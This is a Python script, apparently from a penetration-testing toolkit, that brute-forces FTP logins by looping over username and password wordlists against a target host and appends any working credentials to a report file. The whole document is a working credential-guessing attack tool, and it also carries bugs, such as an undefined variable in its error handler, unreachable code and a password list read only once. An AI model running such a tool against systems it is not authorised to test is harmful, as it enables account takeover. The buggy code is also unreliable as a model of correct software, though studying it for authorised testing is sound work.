#!/usr/bin/python3
import ftplib, linecache, sys, time
from datetime import datetime

def logfile(target,users,passw):
    try:
                
        ufile=open(users,'r')
        pfile=open(passw,'r')
        for user in ufile.readlines():
            for password in pfile.readlines():
                if (bruteftp(target,user,password) is True):
                    break
        return user, password
    except Exception as e:
        print(e)


def bruteftp(target,users,passw):
    try:
        ftp=ftplib.FTP(target)
        user=users.strip('\r').strip('\n')
        password=passw.strip('\r').strip('\n')
        print('Trying with: '+user+" "+password)
        time.sleep(.010)
        ftp.login(user,password)
        print('\n\nLogin succeeded with: '+user+" "+password)                
        
        return True

    except Exception as e:
        print (str(e))
        
        if str(e) == '[WinError 10048] Only one usage of each socket address (protocol/network address/port) is normally permitted':
            exc_type, exc_obj, tb = sys.exc_info()
            f = tb.tb_frame
            lineno = tb.tb_lineno
            filename = f.f_code.co_filename
            linecache.checkcache(filename)
            line = linecache.getline(filename, lineno, f.f_globals)
            print ('EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_o))
            print("Misfire! Cool down for 60 seconds.")
            time.sleep(60)
        print("Incorrect credentials.")
        return False

        print ('EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_o))

def run(hostIP):
    
    host=hostIP

    #Print
    hostLength = 14-len(str(host))
    print ("*" * 60)
    print ("* PasswordCracker.py", " " * 38 + "*") 
    print ("* Please wait, attempting to crack password:", host + " " * hostLength + "*")
    print ("*" * 60)
    time.sleep(1)

    # Start time
    t0 = datetime.now()
    
    users="lists/user.txt"
    passw="lists/password.txt"
    user, password =logfile(host,users,passw)
    
    with open('report.txt', 'a') as f:
        f.write("\nPasswordCracker.py\n")
        f.write("-Credentials-\n")
        f.write("\nUsername: " + user + "\n")
        f.write("\nPassword: " + password + "\n")
    
    # End Time
    t1 = datetime.now()
    
    # Calculate runtime
    total =  t1 - t0
    
    # Generate Report
    print ("Scanning Completed in: ", total, "\n")
    
    return user, password